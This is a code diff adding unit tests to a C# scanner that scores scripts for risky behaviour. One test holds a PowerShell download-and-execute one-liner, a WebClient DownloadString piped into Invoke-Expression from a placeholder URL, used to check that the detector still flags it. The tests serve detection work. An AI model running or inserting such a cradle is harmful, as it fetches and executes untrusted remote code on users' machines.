@@ -15,6 +15,7 @@ public class ScriptAnalyzerTests
     [Theory]
     [InlineData("a.ps1", ScriptKind.PowerShell)]
     [InlineData("a.PSM1", ScriptKind.PowerShell)]
+    [InlineData("a.psd1", ScriptKind.PowerShellData)]
     [InlineData("a.bat", ScriptKind.BatchOrCmd)]
     [InlineData("a.vbs", ScriptKind.VBScript)]
     [InlineData("a.js", ScriptKind.JavaScript)]
@@ -23,6 +24,43 @@ public class ScriptAnalyzerTests
     public void Script_kind_comes_from_the_extension(string path, ScriptKind expected)
     {
         Assert.Equal(expected, ScriptAnalyzer.KindFromExtension(path));
+    }
+
+    /// <summary>
+    /// Microsoft.PowerShell.Utility.psd1 ships with Windows, sits in System32, and was
+    /// scored 25/100 as "downloads something and runs it immediately" -- because its
+    /// export list names both Invoke-WebRequest and Invoke-Expression. A manifest lists
+    /// the commands a module provides; it does not call them.
+    /// </summary>
+    [Fact]
+    public void A_module_manifest_that_exports_dangerous_cmdlets_is_not_scored()
+    {
+        const string manifest = """
+            @{
+            GUID="1DA87E53-152B-403E-98DC-74D7B4D63D59"
+            Author="Microsoft Corporation"
+            ModuleVersion="7.0.0.0"
+            CmdletsToExport="Invoke-Expression", "Invoke-WebRequest", "Invoke-RestMethod",
+                "New-Object", "Start-Process"
+            }
+            """;
+
+        var signals = ScriptAnalyzer.Analyse(manifest, ScriptKind.PowerShellData);
+
+        Assert.All(signals, s => Assert.Equal(0, s.Points));
+    }
+
+    /// <summary>The same text in a real script is still reported: the exemption is for
+    /// the manifest format, not for the words.</summary>
+    [Fact]
+    public void The_same_cmdlets_in_an_actual_script_are_still_reported()
+    {
+        const string script =
+            "$c = New-Object Net.WebClient; Invoke-Expression ($c.DownloadString('http://x/y.ps1'))";
+
+        var signals = ScriptAnalyzer.Analyse(script, ScriptKind.PowerShell);
+
+        Assert.Contains(signals, s => s.Code == "script-download-and-run" && s.Points > 0);
     }
 
     [Fact]
